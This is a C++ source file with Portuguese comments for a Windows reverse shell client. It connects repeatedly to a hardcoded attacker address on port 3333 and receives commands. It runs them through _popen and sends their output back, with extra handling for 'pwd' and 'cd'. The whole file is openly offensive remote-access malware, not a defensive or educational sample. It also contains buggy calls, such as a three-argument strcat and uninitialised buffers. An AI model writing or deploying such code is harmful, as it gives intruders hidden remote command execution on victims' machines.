//////////////
//Autor: Raique
//Machine Target: Windows Client
//Nickname: Rablidad
//Versão: tem muita coisa ainda para adicionar (Não considero esta ainda uma versão final)
/////////////

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <cstdlib>
#include <unistd.h>
#include <cstring>
#include <stdexcept>
#include <vector>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <array>
#include <cstdio>
#include <memory>

using std::cout;
using std::cin;
using std::vector;
using std::exception;
using std::endl;
using std::string;
using std::array;
using std::unique_ptr;

void return_cmd(SOCKET& sockfd);

int main(){
	int connect_result;
	WSADATA wsa;
	//
	//##### struct target addr ######
	const char * host = "192.168.1.31";//"189.78.63.187";
	u_short port = 3333;
	struct sockaddr_in taddr;
	taddr.sin_port = htons(port);
	taddr.sin_family = AF_INET;
	taddr.sin_addr.s_addr = inet_addr(host);
	std::memset(&taddr.sin_zero, '\0', sizeof(taddr.sin_zero));

	int sin_size = sizeof(taddr);

	// ##############################
	//
	WSAStartup(MAKEWORD(2, 0), &wsa);
	SOCKET sockfd = socket(PF_INET, SOCK_STREAM, 0);
	while(true){
		try{
			cout << "[*] Tentando conexão." << endl;	
			if((connect_result = connect(sockfd,(struct sockaddr *)&taddr, sin_size)) == -1)
				throw 99;
			else
				break;
		}catch(int e){
			cout << "[-] Conexão Falhou." << endl;
			cout << "[-] Erro:  " << e << endl;
			cout << "[*] Tentando novamente em 10 segundos." << endl;
			sleep(10);
		}
	}

	
	
	return_cmd(sockfd);

	closesocket(sockfd);


	WSACleanup();
	return 0;

}

void return_cmd(SOCKET& sockfd){
	size_t MIBL =  128; // Minimun Buffer Lenght
	FILE * fp;
	char rcv[128];
	char pwd[64];
	string error("[-] Cliente-Side Error.");
	char str_to_cat[4096];
	char str_1[128];
	int receive_status = 0;
	while(true){
		receive_status = recv(sockfd, rcv , MIBL,0);
		if(receive_status == -1){
			send(sockfd, (const char *)error.c_str(), error.size(), 0);
			continue;
		}
		else{
			if((strncmp(rcv, "exit", 4)) == 0) main();
			else{
				if((strncmp(rcv, "pwd", 3)) == 0){
					_getcwd(pwd , 64);
					strcat(pwd, "> ");
					send(sockfd, pwd, strlen(pwd),0);
					continue;
				}
				else{
					if( (strncmp(rcv, "cd", 2))== 0){
							char destdir[64];
							string full_path;
							for(int i=3, j=0; rcv[i] != '\0' ;i++, j++){
								destdir[j] = rcv[i]; 
							}
							char full_dir[strlen(destdir)];
							strcat(full_dir, destdir, strlen(destdir));

							_chdir(full_dir);
							_getcwd(pwd , 64);
							strncat(pwd, "> ");
							full_path.append(pwd);
							send(sockfd, full_path.c_str(), full_path.size(), 0);
						
					}
					else{


						fp=_popen(rcv, "rb");
						if(fp){
							while(!feof(fp)){
								if((fgets(str_1,128,fp)) != NULL){
									strcat(str_to_cat, str_1);
								}
							}
						
							send(sockfd, str_to_cat, strlen(str_to_cat), 0);
						}
					}
				}
			}
		}
	}
	_pclose(fp);
}
